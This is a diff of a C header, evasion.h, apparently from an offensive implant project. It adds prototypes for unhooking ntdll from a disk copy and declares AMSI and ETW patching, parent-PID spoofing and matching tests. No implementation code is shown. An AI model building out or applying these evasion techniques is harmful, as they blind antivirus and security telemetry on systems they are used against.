@@ -31,10 +31,24 @@ typedef struct _WIN32_API {
 } WIN32_API, *PWIN32_API;
 
 // Public prototypes
+BOOL MapNtdllFromDisk(OUT PVOID *ppNtdllBuf);
+PVOID FetchLocalNtdllBaseAddress(VOID);
+BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedNtdll);
 BOOL unhook_ntdll(VOID);
 BOOL patch_amsi(VOID);
 BOOL patch_etw(VOID);
 BOOL ppid_spoof(DWORD parentPid, LPCSTR targetExe, PPROCESS_INFORMATION pPi);
 BOOL evasion_run(VOID);
+
+#ifdef BEACON_TEST
+BOOL test_ntdll_map_from_disk(void);
+BOOL test_ntdll_fetch_local_base(void);
+BOOL test_ntdll_unhook_success(void);
+BOOL test_ntdll_replace_text(void);
+BOOL test_amsi_patch_success(void);
+BOOL test_amsi_not_loaded(void);
+BOOL test_etw_patch_success(void);
+BOOL test_evasion_full_pipeline(void);
+#endif
 
 #endif /* EVASION_H */
